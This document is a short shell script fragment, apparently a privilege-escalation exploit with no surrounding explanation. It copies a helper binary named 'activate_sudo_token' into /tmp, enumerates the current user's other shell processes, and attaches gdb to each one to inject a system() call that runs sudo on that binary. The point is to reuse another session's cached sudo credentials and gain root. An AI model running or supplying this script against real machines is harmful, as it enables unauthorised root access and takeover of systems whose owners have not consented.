cp activate_sudo_token /tmp
for pid in $(pgrep '^(ash|ksh|cshdash|bash|zsh|tcsh|sh)$' -u "$EUID" | grep -v "^$$\$")
do
	gdb -q -p "$pid" <<< $'call system("echo | sudo -S /tmp/activate_sudo_token")'
done
